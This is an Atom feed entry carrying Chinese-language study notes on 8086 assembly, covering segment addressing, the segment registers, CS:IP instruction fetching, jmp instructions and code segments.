    <content type="html"><![CDATA[<h1 id="2-8段的概念"><a href="#2-8段的概念" class="headerlink" title="2.8段的概念"></a>2.8段的概念</h1><p>内存并没有分段，短的划分来自于CPU，由于8086CPU用“段地址<em>16+偏移地址=物理地址”的方式给出内存单元的物理地址，使得我们可以用分段的方式来管理内存。<br><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210718194557.jpeg" alt="l4rd58.jpg"><br>看需要我们可以将若干地址连续的内存单元看作一个段<br>（1）段地址</em>16必然是16的倍数，所以一个段的起始地址也一定是16的倍数<br>（2）偏移地址为16位，16位地址的寻址能力为64k，所以一个段的长度最大为64k<br>寻址范围:<br>偏移地址16位，变化范围为0<del>FFFFH，仅用偏移地址来寻址最多可寻64K个内存单元。<br>给定段地址1000H，用偏移地址寻址，CPU的寻址范围为：10000H</del>1FFFFH<br>数据在21F60H内存单元中，对于8086PC机的两种描述：<br>1.数据存在内存2000：1F60单元中<br>2.数据存在内存的2000段中的1F60H单元中</p><h1 id="2-9段寄存器"><a href="#2-9段寄存器" class="headerlink" title="2.9段寄存器"></a>2.9段寄存器</h1><p>段寄存器就是提供段地址的<br>8086CPU有4个段寄存器：<br>CS，DS，SS，ES<br>CS 代码段地址寄存器<br>DS 数据段<br>SS 堆栈段<br>ES 附加段</p><p>当8086CPU要访问内存时，由这4个寄存器提供内存单元的段地址<br>IP为指令指针寄存器（与上网的不同）<br>CS和IP时8086CPU中最关键的寄存器，它们指示了CPU当前要读取指令的地址。<br>** CS存放指令的段地地址 **<br>** IP存放指令的偏移地址 **<br><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210718194605.jpeg" alt="l4r0PS.jpg"><br>B8是mov ax的意思<br>23 01是存储的数据 线性上低下高<br>有的是3个字节，有的是2个字节<br>步骤一、从CS:IP指向内存单元读取指令，读取的指令进入指令缓冲区；<br>步骤二、IP=IP+所读指令的长度（图中mov ax，0123H为三字节)，从而指向下一条指令；<br>步骤三、执行指令。转到步骤一<br>8086CPU启动或复位后CS和IP被设置为CS=FFFFH，IP=0000H<br>8086PC机刚启动时，CPU从内存FFFF0H单元中读取指令执行<br>FFFF0H单元中的指令是8086PC机开机后执行的第一条指令</p><h1 id="2-10"><a href="#2-10" class="headerlink" title="2.10"></a>2.10</h1><p>内存中的一段信息曾被CPU执行过的话，那么，它所在的内存单元必然被CS:IP指向过</p><h1 id="2-11修改CS、IP的指令"><a href="#2-11修改CS、IP的指令" class="headerlink" title="2.11修改CS、IP的指令"></a>2.11修改CS、IP的指令</h1><p>jmp 段地址:偏移地址<br>jmp  2AE3:3  (2AE33)<br>jmp  3:0B16  (00B46H)<br>jmp 某一合法寄存器<br>jmp ax (类似 mov IP,ax)<br>jmp bx<br>功能:用寄存器中的值修改IP</p><h1 id="2-12代码段"><a href="#2-12代码段" class="headerlink" title="2.12代码段"></a>2.12代码段</h1><p>对于8086PC机，在编程时，可以根据需要，将一组内存单元定义为一个段。<br>可以将长度为N（N&lt;=64KB）的一组代码，存在一组地址连续、起始地址为16的倍数的内存单元中，这段内存是用来存放代码的，从而定义了一个代码段。<br>要执行代码段，需要CPU认CS:IP指向的内存单元中的内容为指令<br>所以要将CS:IP指向所定义的代码段中的第一条指令的首地址</p><h1 id="蓝屏一般是内存问题"><a href="#蓝屏一般是内存问题" class="headerlink" title="蓝屏一般是内存问题"></a>蓝屏一般是内存问题</h1><p><strong>sub ax，ax相当于对ax清零。这种减法操作比直接用mov ax，0更快。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2-8段的概念&quot;&gt;&lt;a href=&quot;#2-8段的概念&quot; class=&quot;headerlink&quot; title=&quot;2.8段的概念&quot;&gt;&lt;/a&gt;2.8段的概念&lt;/h1&gt;&lt;p&gt;内存并没有分段，短的划分来自于CPU，由于8086CPU用“段地址&lt;em&gt;16+偏移地址=物理地址”</summary>
      
    
    
    
    <category term="汇编" scheme="http://example.com/categories/%E6%B1%87%E7%BC%96/"/>
    
    
  </entry>
  
</feed>
